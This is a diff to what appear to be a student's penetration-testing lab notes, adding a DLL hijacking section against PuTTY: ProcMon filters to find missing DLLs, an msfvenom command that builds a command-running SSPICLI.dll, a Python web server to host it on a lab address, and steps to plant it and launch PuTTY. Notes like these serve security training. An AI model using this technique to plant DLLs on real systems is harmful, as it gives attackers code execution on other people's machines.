@@ -105,8 +105,17 @@ lin-ops#  ssh -S /tmp/Winders jump
 
 lin-ops#  xfreerdp /u:Aaron /v:localhost:4444 /dynamic-resolution +clipboard    (Add correct hostkey to filepath)
 
+##DLL HIJACKING##
+Process Name contains putty.exe    (ProcMon)
+Path contains .dll
+Result is NAME NOT FOUND
 
+student@lin-ops:~$ msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+student@lin-ops:~$ python3 -m http.server 42070
 
+http://10.50.188.39:42070  #ON WINDOWS#
+##GRAB DLL ON WINDOWS MACHINE##
+##RUN PUTTY## (NEW FILE NAMED YOUR COMMAND SHOULD BE POPULATED)
 
 
 
